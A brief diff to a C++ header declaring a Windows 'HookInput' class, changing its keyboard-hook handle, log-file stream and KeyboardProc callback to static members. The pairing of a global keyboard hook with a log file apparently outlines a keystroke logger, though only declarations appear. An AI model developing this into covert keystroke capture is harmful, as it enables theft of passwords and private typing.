@@ -1,18 +1,15 @@
 #pragma once
 #include <Windows.h>
-#include <stdio.h>
 #include <fstream>
 
 class HookInput
 {
 public:
-	void startTracking(void* pParam);
-	void stopTracking();
-
+	static void startTracking(void* pParam);
+	static void stopTracking();
 private:
 	static HHOOK keyboardHook;
-	std::ofstream logFile;
-
-	LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+	static std::ofstream logFile;
+	static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
 
